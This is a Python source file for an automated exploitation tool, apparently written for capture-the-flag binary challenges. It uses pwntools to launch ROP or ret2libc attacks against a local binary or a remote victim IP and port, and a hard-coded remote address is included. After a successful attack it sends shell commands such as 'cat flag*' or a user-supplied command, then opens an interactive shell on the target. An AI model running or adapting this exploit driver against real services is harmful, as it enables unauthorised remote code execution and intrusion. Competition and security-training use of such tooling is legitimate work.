from pwn import *
# from ropgenerator import *
from struct import pack
import re, os, sys, subprocess, pwnlib, binascii
from pwnlib.term import text
import ABEModules as ABE

try:
    from ropper import RopperService
except:
    print("Ropper is needed for Ropchain! manual install or use -init(WIP)")
    pass
helpmsg = " \n Usage: to Work correctly you have to fill out the midroll and postroll(when using ret2libc etc..)\n to ensure that the script gets the correct vulnerable entrypoint!\n -f <filename>\n -core (Use coredumps)\n -vic <ip> <port>\n -ibu <startbufsize>\n -NoDas (No dealarm shell)\n -loc (localonly)\n -fupa <fullPath>\n -h help\n -gen <generator> (ropper(default)/RopGad/ropperService/RopGen)\n -debug (noCore)\n -debugCore (debug with coredump,only local)\n -a <attackType> (rop(default)/ret2libc/SOS(shellcode on stack(WIP!!))\n -libc <path to libc>\n -flag (auto cat flag.txt;cat flag)\n -cmd  <shellcommand> (custom shell command to be executed as string) \n -init (WIP!!!! do NOT use if you dont know what it does!!!)\n      use sudo python AutoB...)"
attackType = "rop"



def preroll(rem):  # HowToUse False for remote True for binary
    global config
    if rem or config._ForcedLoc:
        if config._LDPRE:
            pathlib=ELF(config._pathtolibc).path
            envy={"LD_PRELOAD":pathlib}
            rm = process(config._binny,env=envy )
        else:
            rm = process(config._binny)
    else:
        try:
            rm = remote(config._remIP, config._remPort)
        except:     #TODO case distinction for python2/3 usage of raw_input
            cont = str(raw_input("Unable to connect! Is the Target still up?\nDo you want to run it locally instead? (y/n)\n"))
            if "y" in cont:
                rm = process(config._binny)
                config._ForcedLoc = True
            else:
                exit(0)
    return midroll(rm)


def midroll(rm):  # TODO insert Prepping
    #rm.recvuntil("What say you now?")
    rm.clean()
    for x in config._input:
        rm.sendline(x)
        rm.clean()
    #rm.recvuntil("Tell me more.")
    return rm


def postroll(rem):  # TODO there to catch shit that comes back!
    #rem.recvuntil("Fascinating.\n")
    rem.clean()
    return rem

def rolling():
    config = parseargs()
    AutoAttack(config)
    dump=ABE.init(config)
    #logic=ABE.LogicParser()
    #logic.selectAnalMode("revIfs")
    buf = ABE.Buff()
    buflen = buf.finder()
    retlib=ABE.libMe()

def attack(log, buffer):
    global attackType
    attackTypes = {"rop": ropattack, "ret2libc": ret2libcattack, "SOS": shellcodeattack}
    func = attackTypes.get(attackType, ropattack)
    func(log, buffer)

def shellcodeattack(log, buffer):
    pass


def SnC(rma, payload):
    globals()
    global config
    if config._debugfinalPayload:
        context.log_level = "debug"
    rma.sendline(payload)
    sleep(1)
    rm = postroll(rma)
    resp=rm.clean()
    if config._LDPRE:
        if rm.poll() == -11:
            print("YESS")
    if config._shellcmd:
        rm.sendline(config._shellcmd)
    if config._autoCatflag and config._shellcmd is None:
        rm.sendline("cat flag*")
        #rm.sendline("cat ../../../../*/*/*/*/*/flag*") TODO Check if this works
    if config._dealarm and not config._LocalOnly and not config._autoCatflag and config._shellcmd is None:
        dealarm_shell(rm)
    if rm.connected("read"):
        sleep(1)
    else:
        print("NOT Connected!")
        raise Exception
    config._logGen.success("Here Comes The Shell!")
    rm.interactive(text.blue("ABE$>"))
    rm.wait()

def debugPayload(rm, payload):
    context.log_level = "debug"
    os.remove("./core")
    rm.sendline(payload)
    sleep(1)
    if config._autoCatflag:
        rm.sendline("cat flag.txt;cat flag")
    if config._dealarm and not config._LocalOnly and not config._autoCatflag:
        dealarm_shell(rm)
    rm.interactive(text.blue("ABE$>"))
    core = Coredump("./core")
    print(core.registers)

def AutoAttack(config):
    globals()
    if config._AutoAttackType:
        analELF(config)
    else:
        pass


def parseargs():
    globals()
    global config
    config = Config()
    arglist = sys.argv
    argn = len(arglist)
    avargs = {"-f": setFilename, "-core": setCore, "-vic": setVictim, "-ibu": setinitBuff,
              "-loc": setLocalOnly, "-fupa": setFullPath, "-h": help, "-gen": setGen, "-NoDas": setNoDealarm,
              "-debug": setDebug, "-debugCore": setDebugCore, "-a": setAttackType, "-libc": setlibc,
              "-flag": setgetflag, "-init": initToolChains, "-cmd": setShellCmd}
    for x in range(argn):
        arg = arglist[x]
        funct = avargs.get(arg, Pass)
        funct(x, config)
    global e
    e = ELF(config._binaryfile)
    config._elf = e
    return config


def setShellCmd(x, config):
    config._shellcmd = sys.argv[x + 1]


def setgetflag(x, config):
    config._autoCatflag = True


def setlibc(x, config):
    config._pathtolibc = sys.argv[x + 1]
    config._manuallibc = True


def setAttackType(x, config):
    config._attackType = sys.argv[x + 1]
    config._AutoAttackType = False


def setDebugCore(x, config):
    config._debugfinalPayloadCore = True


def setDebug(x, config):
    config._debugfinalPayload = True


def setNoDealarm(x, config):
    config._dealarm = False


def setGen(x, config):
    config._generator = sys.argv[x + 1]

def Pass(x, config): pass


def help(x, config):
    global helpmsg
    print(str(sys.argv[0]) + helpmsg)
    exit(0)


def setFilename(x, config):
    config._binaryfile = sys.argv[x + 1]
    config._binny = "./" + config._binaryfile


def setCore(x, config):
    config._UseCore = True


def setLocalOnly(x, config):
    config._LocalOnly = True


def setVictim(x, config):
    config._remIP = sys.argv[x + 1]
    config._remPort = int(sys.argv[x + 2])


def setinitBuff(x, config):
    config._payroll = int(sys.argv[x + 1])


def setFullPath(x, config):
    config._binfupa = sys.argv[x + 1]


def analELF(config):
    global e, attackType
    if e.execstack and False:  # TODO implement Shellcode on stack
        attackType = "SOS"
        config._attackType = "SOS"
    elif e.statically_linked:
        config._attackType = "rop"
    else:
        config._attackType = "ret2libc"


def initToolChains(x, config):
    if os.path.isdir("./ABEToolChain"):
        pass
    else:
        os.mkdir("ABEToolChain")
    if os.path.isdir("./ABEToolChain/libcdb"):
        pass
    else:
        os.system("git clone https://github.com/niklasb/libc-database.git ./ABEToolChain/libcdb")
        os.system("./ABEToolChain/libcdb/get")
        print("If something fails , run './ABEToolChain/libcdb/get'  ! \n")
        pass
    if os.path.isdir("./ABEToolChain/ropgenerator"):
        pass
    else:
        pass  # TODO ropgenerator ... not needed at this moment
    if os.path.isdir("./ABEToolChain/ropper"):
        pass
    else:
        os.system("pip install capstone --user;pip install keystone-engine --user ")
        os.system("git clone https://github.com/sashs/ropper.git ./ABEToolChain/ropper")
        os.system("cd ABEToolChain/ropper ; git submodule init ; git submodule update ; python setup.py install --user")
    exit(0)

class Config:
    _binfupa = "/root/PycharmProjects/SaarSec/speedrun-002"  # HowToUse Full Path to file without "./"#
    _binaryfile = "speedrun-002"  # HowToUse Filename#
    _remIP = "78.46.187.115"  # HowToUse set remote IP as String#
    _remPort = 20015  # HowToUse set remote Port as int#
    _payroll = 1020  # HowToUse Set Buffer Start Size#
    _binny = "./" + _binaryfile
    _UseCore = False
    _LocalOnly = False
    _generator = "ropper"
    _toolpa = "./ABEToolChain/"
    _dealarm = True
    _debugfinalPayload = False
    _debugfinalPayloadCore = False
    _isStatical = True
    _attackType = "rop"
    _AutoAttackType = True
    _pathtolibc = "libc-2.28-debian-10.so"
    _manuallibc = False
    _autoCatflag = False
    _ForcedLoc = False
    _shellcmd = None
    _elf = None
    _logGen = None
    _LDPRE=False
    _input=None
    def midroll(self,rm):
        return midroll(rm)
    def postroll(self,rm):
        return postroll(rm)
    def preroll(self,rm):
        return preroll(rm)
    def SnC(self,rm,paylaod):
        SnC(rm,paylaod)
    def debugPayload(self,rm,payload):
        debugPayload(rm,payload)




if __name__ == '__main__':
    rolling()
